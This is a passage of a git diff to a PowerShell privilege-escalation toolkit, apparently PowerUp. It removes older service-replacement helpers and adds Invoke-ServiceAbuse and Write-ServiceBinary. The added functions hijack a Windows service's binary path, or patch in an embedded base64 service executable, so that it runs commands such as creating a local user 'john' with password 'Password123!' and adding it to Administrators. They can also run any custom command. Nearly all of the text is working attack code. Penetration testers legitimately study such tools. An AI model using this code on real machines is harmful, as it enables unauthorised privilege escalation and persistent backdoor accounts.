AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
-    [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)
-
-    # get the unicode byte conversions of all arguments
-    $Enc = [System.Text.Encoding]::Unicode
-    $ServiceNameBytes = $Enc.GetBytes($ServiceName)
-    $CMDBytes = $Enc.GetBytes($CMD)
-
-    # patch all values in to their appropriate locations
-    for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
-        # service name offset = 2458
-        $Binary[$i+2458] = $ServiceNameBytes[$i]
-    }
-    for ($i=0; $i -lt ($CMDBytes.Length); $i++) { 
-        # cmd offset = 2535
-        $Binary[$i+2535] = $CMDBytes[$i]
-    }
-
-    try {
-        # write the binary array out to the specified path
-        Set-Content -Balue $Binary -Encoding Byte -Path $Path
-        "[*] Binary for service '$ServiceName' with custom command '$CMD' written to '$Path'"
-    }
-    catch {
-        Write-Warning "Error while writing to location '$Path': $_"
-        $False
-    }
-}
-
-
-function Write-ServiceEXE {
-<#
-    .SYNOPSIS
-
-        This function user Write-UserAddServiceBinary to write a service
-        that creates a local user and adds it to specified local group.
-
-    .PARAMETER ServiceName
-
-        The service name to manipulate. Required.
-
-    .PARAMETER UserName
-
-        The username to add. If not given, it defaults to "john"
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER GroupName
-
-        Group to add the user to (default of Administrators)
-        
-    .EXAMPLE
-
-        PS C:\> Write-ServiceEXE -ServiceName VulnSVC
-
-        Replaces the binary for service 'VulnSVC' with one that adds 
-        a localuser "john" with password "Password123! to the machine 
-        and local administrator group
-
-    .EXAMPLE
-
-        PS C:\> Write-ServiceEXE -ServiceName VulnSVC -UserName backdoor -Password password -GroupName "Power Users"
-       
-        Replaces the binary for service 'VulnSVC' with one that adds a 
-        localuser "backdoor" with password "password" to the machine 
-        and local "Power Users" group
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [string]
-        $UserName = "john",
-
-        [string]
-        $Password = "Password123!",
-
-        [string]
-        $GroupName = "Administrators"
-    )
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-
-            $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
-            $BackupPath = $ServicePath + ".bak"
-
-            Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
-            Move-Item $ServicePath $BackupPath
-
-            # write the proper service binary to the target path
-            Write-UserAddServiceBinary -ServiceName $ServiceName -UserName $UserName -Password $Password -GroupName $GroupName -Path $ServicePath
-        }
-        catch{
-            Write-Warning "Error: $_"
-            $False
-        }
-    }
-
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $False
-    }
-}
-
-
-function Write-ServiceEXECMD {
-<#
-    .SYNOPSIS
-
-        This function user Write-CMDServiceBinary to write a service
-        that executes a custom command.
-
-    .PARAMETER ServiceName
-
-        The service name to manipulate. Required.
-
-    .PARAMETER CMD
-
-        The command to execute.
-        
-    .EXAMPLE
-
-        PS C:\> Write-ServiceEXE -ServiceName VulnSVC -CMD "something"
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-        
-        [Parameter(Mandatory = $True)]
-        [string]
-        $CMD
-    )
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-
-            $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
-            $BackupPath = $ServicePath + ".bak"
-
-            Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
-            Move-Item $ServicePath $BackupPath
-
-            # write the proper service binary to the target path
-            Write-CMDServiceBinary -ServiceName $ServiceName -CMD $CMD -Path $ServicePath
-        }
-        catch{
-            Write-Warning "Error: $_"
-            $False
-        }
-    }
-
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $False
-    }
-}
-
-
-function Restore-ServiceEXE {
-<#
-    .SYNOPSIS
-
-        This function copies in the backup executable to the original 
-        binary path for a servie.
-
-    .PARAMETER ServiceName
-
-        The service name to manipulate. Required.
-  
-    .PARAMETER BackupPath
-
-        Optional manual path to the backup binary.
-        
-    .EXAMPLE
-
-        PS C:\> Restore-ServiceEXE -ServiceName VulnSVC
-
-        Restore the original binary for the service 'VulnSVC'
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [string]
-        $BackupPath
-    )
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-
-            $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
-
-            if ($BackupPath -eq $null -or $BackupPath -eq ''){
-                $BackupPath = $ServicePath + ".bak"
-            }
-
-            "Restoring up '$BackupPath' to '$ServicePath'"
-            Copy-Item $BackupPath $ServicePath
-
-            "Removing backup binary '$BackupPath'"
-            Remove-Item $BackupPath
-        }
-        catch{
-            Write-Warning "Error: $_"
-            $False
-        }
-    }
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $False
-    }
-}
-
-
-function Invoke-ServiceStart {
-<#
-    .SYNOPSIS
-
-        This function starts a specified service, first enabling the service
-        if it was marked as disabled.
-
-    .PARAMETER ServiceName
-
-        The service name to start. Required.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceStart -ServiceName VulnSVC
-
-        Start the 'VulnSVC' service.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName
-    )
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-    
-    # make sure we got a result back
-    if (-not ($TargetService)){
-        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
-        return $False
-    }
-        
-    try{
-        # enable the service if it was marked as disabled
-        if ($TargetService.StartMode -eq "Disabled"){
-            $r = Invoke-ServiceEnable -ServiceName $TargetService.Name
-            if (-not $r){ 
-                return $False 
-            }
-        }
-
-        # check if the current user has the DACL service permisson 'RP' (Start) 
-        $Result = Test-ServiceDaclPermission -ServiceName $TargetService.Name -Dacl 'RP'
-        
-        if ($Result){
-            # start the service
-            Write-Verbose "Starting service '$TargetService.Name'"
-            sc.exe start $($TargetService.Name) | Out-Null
-            return $True
-        }
-        else{
-            Write-Warning "[!] Current user does not have permissions to start the service '$($TargetService.Name)'"
-            return $False
-        }
-    }
-    catch{
-        Write-Warning "Error: $_"
-        return $False
-    }
-}
-
-
-function Invoke-ServiceStop {
-<#
-    .SYNOPSIS
-
-        This function stops a specified service.
-
-    .PARAMETER ServiceName
-
-        The service name to stop. Required.
-        
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceStop -ServiceName VulnSVC
-
-        Stop the 'VulnSVC' service.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName
-    )
-    
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if (-not ($TargetService)){
-        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
-        return $False
-    }
-
-    try{
-        # check if the current user has the DACL service permisson 'WP' (Stop) 
-        $Result = Test-ServiceDaclPermission -ServiceName $TargetService.Name -Dacl 'WP'
-        
-        if ($Result){
-            # stop the service
-            Write-Verbose "Stopping service '$TargetService.Name'"
-            sc.exe stop $($TargetService.Name) | Out-Null
-            return $True
-        }
-        else{
-            Write-Warning "[!] Current user does not have permissions to stop the service '$($TargetService.Name)'"
-            return $False
-        }
-    }
-    catch{
-        Write-Warning "Error: $_"
-        return $False
-    } 
-}
-
-
-function Invoke-ServiceEnable {
-<#
-    .SYNOPSIS
-
-        This function enables a specified service.
-
-    .PARAMETER ServiceName
-
-        The service name to enable. Required.
-        
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceEnable -ServiceName VulnSVC
-
-        Enables the 'VulnSVC' service.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName
-    )
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if (-not ($TargetService)){
-        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
-        return $False
-    }
-    
-    try{
-        # check if the current user has the DACL service permisson 'DC' (ChangeConf) 
-        $Result = Test-ServiceDaclPermission -ServiceName $TargetService.Name -Dacl 'DC'
-        
-        if ($Result){
-            # enable the service
-            Write-Verbose "Enabling service '$TargetService.Name'"
-            sc.exe config $($TargetService.Name) start= demand | Out-Null
-            return $True
-        }
-        else{
-            Write-Warning "[!] Current user does not have permissions to enable the service '$($TargetService.Name)'"
-            return $False
-        }
-    }
-    catch{
-        Write-Warning "Error: $_"
-        return $False
-    }
-}
-
-
-function Invoke-ServiceDisable {
-<#
-    .SYNOPSIS
-
-        This function disables a specified service.
-
-    .PARAMETER ServiceName
-
-        The service name to disable. Required.
-    
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceDisable -ServiceName VulnSVC
-
-        Disables the 'VulnSVC' service.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName
-    )
-    
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if (-not ($TargetService)){
-        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
-        return $False
-    }
-    
-    try{
-        # check if the current user has the DACL service permisson 'DC' (ChangeConf) 
-        $Result = Test-ServiceDaclPermission -ServiceName $TargetService.Name -Dacl 'DC'
-        
-        if ($Result){
-            # disable the service
-            Write-Verbose "Disabling service '$TargetService.Name'"
-            sc.exe config $($TargetService.Name) start= disabled | Out-Null
-            return $True
-        }
-        else{
-            Write-Warning "[!] Current user does not have permissions to disable the service '$($TargetService.Name)'"
-            return $False
-        }
-    }
-    catch{
-        Write-Warning "Error: $_"
-        return $False
     }
 }
 
@@ -1258,7 +424,7 @@ function Get-ServiceDetail {
 <#
     .SYNOPSIS
 
-        This function returns detailed information about a service.
+        Returns detailed information about a specified service.
 
     .PARAMETER ServiceName
 
@@ -1273,27 +439,553 @@ function Get-ServiceDetail {
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory = $True)] 
-        [string]
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
         $ServiceName
     )
 
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-            $TargetService | Format-List *
-        }
-        catch{
-            Write-Warning "Error: $_"
-            $null
+    process {
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_} | ForEach-Object {
+            try {
+                $TargetService | Format-List *
+            }
+            catch{
+                Write-Warning "Error: $_"
+                $null
+            }            
         }
     }
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $null
+}
+
+
+########################################################
+#
+# Service abuse
+#
+########################################################
+
+function Invoke-ServiceAbuse {
+<#
+    .SYNOPSIS
+
+        This function stops a service, modifies it to create a user, starts
+        the service, stops it, modifies it to add the user to the specified group,
+        stops it, and then restores the original EXE path. It can also take a 
+        custom -CMD argument to trigger a custom command instead of adding a user.
+        
+    .PARAMETER ServiceName
+
+        The service name to manipulate. Required.
+
+    .PARAMETER UserName
+
+        The [domain\]username to add. If not given, it defaults to "john".
+        Domain users are not created, only added to the specified localgroup.
+
+    .PARAMETER Password
+
+        The password to set for the added user. If not given, it defaults to "Password123!"
+
+    .PARAMETER LocalGroup
+
+        Local group name to add the user to (default of Administrators).
+    
+    .PARAMETER Command
+    
+        Custom local command to execute.
+
+    .EXAMPLE
+
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC
+
+        Abuses service 'VulnSVC' to add a localuser "john" with password 
+        "Password123! to the  machine and local administrator group
+
+    .EXAMPLE
+
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john"
+
+        Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
+        local adminisrtators group.
+
+    .EXAMPLE
+
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
+
+        Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
+        "password" to the  machine and local "Power Users" group
+
+    .EXAMPLE
+
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."
+
+        Abuses service 'VulnSVC' to execute a custom command.
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName,
+
+        [String]
+        $UserName = "john",
+
+        [String]
+        $Password = "Password123!",
+
+        [String]
+        $LocalGroup = "Administrators",
+
+        [String]
+        $Command
+    )
+
+    process {
+
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
+
+        # make sure we got a result back
+        if ($TargetService) {
+
+            $ServiceAbused = $TargetService.Name
+            $UserAdded = $Null
+            $PasswordAdded = $Null
+            $GroupnameAdded = $Null
+
+            try {
+                # check if sc.exe exists
+                if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))){ 
+                    throw "Could not find $Env:SystemRoot\System32\sc.exe"
+                }
+
+                # try to enable the service it was disabled
+                $RestoreDisabled = $False
+                if ($TargetService.StartMode -eq "Disabled") {
+                    Write-Verbose "Service '$ServiceName' disabled, enabling..."
+                    if(-not $(Invoke-ServiceEnable -ServiceName $ServiceName)) {
+                        throw "Error in enabling disabled service."
+                    }
+                    $RestoreDisabled = $True
+                }
+
+                # extract the original path and state so we can restore it later
+                $OriginalPath = $TargetService.PathName
+                $OriginalState = $TargetService.State
+                Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
+                Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
+
+                $Commands = @()
+
+                if($Command) {
+                    # only executing a custom command
+                    $Commands += $Command
+                }
+                elseif($UserName.Contains("\")) {
+                    # adding a domain user to the local group, no creation
+                    $Commands += "net localgroup $LocalGroup $UserName /add"
+                }
+                else {
+                    # creating a local user and adding to the local group
+                    $Commands += "net user $UserName $Password /add"
+                    $Commands += "net localgroup $LocalGroup $UserName /add"
+                }
+
+                foreach($Cmd in $Commands) {
+                    if(-not $(Invoke-ServiceStop -ServiceName $TargetService.Name)) {
+                        throw "Error in stopping service."
+                    }
+
+                    Write-Verbose "Executing command '$Cmd'"
+
+                    $Result = sc.exe config $($TargetService.Name) binPath= $Cmd
+                    if ($Result -contains "Access is denied."){
+                        throw "Access to service $($TargetService.Name) denied"
+                    }
+
+                    Start-Sleep -s 1
+                    $Null = Invoke-ServiceStart -ServiceName $TargetService.Name
+                }
+ 
+                # cleanup and restore the original binary path
+                Write-Verbose "Restoring original path to service '$ServiceName'"
+                $Null = sc.exe config $($TargetService.Name) binPath= $OriginalPath
+
+                # try to restore the service to whatever state it was
+                if($RestoreDisabled) {
+                    Write-Verbose "Re-disabling service '$ServiceName'"
+                    $Result = sc.exe config $($TargetService.Name) start= disabled
+                }
+                elseif($OriginalState -eq "Paused") {
+                    Write-Verbose "Starting and then pausing service '$ServiceName'"
+                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
+                    $Null = sc.exe pause $($TargetService.Name)
+                }
+                elseif($OriginalState -eq "Stopped") {
+                    Write-Verbose "Leaving service '$ServiceName' in stopped state"
+                }
+                else {
+                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
+                }
+            }
+            catch {
+                Write-Warning "Error while modifying service '$ServiceName': $_"
+                $Commands = @("Error while modifying service '$ServiceName': $_")
+            }
+        }
+
+        else {
+            Write-Warning "Target service '$ServiceName' not found on the machine"
+            $ServiceAbused = "Not found"
+        }
+
+        $Out = New-Object PSObject
+        $Out | Add-Member Noteproperty 'ServiceAbused' $ServiceAbused
+        $Out | Add-Member Noteproperty 'Commands' $($Commands -join " && ")
+        $Out
+    }
+}
+
+
+function Write-ServiceBinary {
+<#
+    .SYNOPSIS
+
+        Takes a precompiled C# service executable and binary patches in a 
+        custom shell command or commands to add a local administrator.
+        It then writes the binary out to the specified location.
+        Domain users are only added to the specified LocalGroup.
+        
+    .PARAMETER ServiceName
+
+        The service name the EXE will be running under. Required.
+
+    .PARAMETER Path
+
+        Path to write the binary out to, defaults to the local directory.
+
+    .PARAMETER UserName
+
+        The [DOMAIN\username] to add, defaults to 'john'.
+
+    .PARAMETER Password
+
+        The password to set for the added user, default to 'Password123!'.
+
+    .PARAMETER LocalGroup
+
+        Local group to add the user to, defaults to 'Administrators'.
+
+    .PARAMETER Command
+
+        A custom command to execute.
+
+    .EXAMPLE
+
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC
+
+        Writes the service binary for VulnSVC that adds a local administrator
+        to the local directory.
+
+    .EXAMPLE
+
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
+
+        Writes the service binary for VulnSVC that adds TESTLAB\john to the local
+        administrators to the local directory.
+
+    .EXAMPLE
+
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
+
+        Writes the service binary for VulnSVC that adds a local administrator of
+        name 'backdoor' with password 'Password123!' to the local directory.
+
+    .EXAMPLE
+
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -Command "net ..."
+
+        Writes the service binary for VulnSVC that executes a local command
+        to the local directory.
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName,
+
+        [String]
+        $ServicePath = "service.exe",
+
+        [String]
+        $UserName = "john",
+
+        [String]
+        $Password = "Password123!",
+
+        [String]
+        $LocalGroup = "Administrators",
+
+        [String]
+        $Command
+    )
+
+    begin {
+        # the raw unpatched service binary
+        $B64Binary = "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UmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAElEaXNwb3NhYmxlAENvbnRhaW5lcgBTdHJpbmcAVHJpbQBzZXRfU2VydmljZU5hbWUAUHJvY2VzcwBTdGFydABTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABTbGVlcABFbnZpcm9ubWVudABFeGl0AFJ1bgAARUEAQQBBACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAL/3LwBDACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgA